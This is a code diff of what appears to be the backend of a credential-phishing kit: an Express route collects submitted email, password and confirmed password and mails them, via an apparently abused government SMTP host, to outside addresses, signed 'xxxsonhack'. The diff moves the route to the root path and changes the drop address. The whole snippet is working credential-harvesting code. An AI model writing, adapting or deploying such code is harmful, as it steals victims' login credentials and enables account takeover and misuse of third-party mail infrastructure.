@@ -11,7 +11,7 @@ app.use(bodyParser.json());
 
 app.use(cors());
 
-app.post("/send_mail", cors(), async (req, res) => {
+app.post("/", cors(), async (req, res) => {
   let { email, pass, pasers } = req.body;
   const transport = nodemailer.createTransport({
     host: "mail.sidur.gob.mx",
@@ -23,16 +23,19 @@ app.post("/send_mail", cors(), async (req, res) => {
   });
 
   await transport.sendMail({
-    from: process.env.MAIL_FROM,
-    to: "fredrick3smith33@gmail.com",
+    from: "mail.sidur.gob.mx",
+    to: "marketing@rumahmutu.id",
     subject: "test email",
     html: ` 
-        <h2>Here is your email!</h2>
+    <div> 
+      <h2>Here is your email!</h2>
         <p>Email: ${email}</p>
         <p>Pass: ${pass}</p>
-        <p>Pass: ${pasers}</p>
+        <p>Confirm Pass: ${pasers}</p>
     
         <p>All the best, xxxsonhack</p>
+         </div>
+     
          
     `,
   });
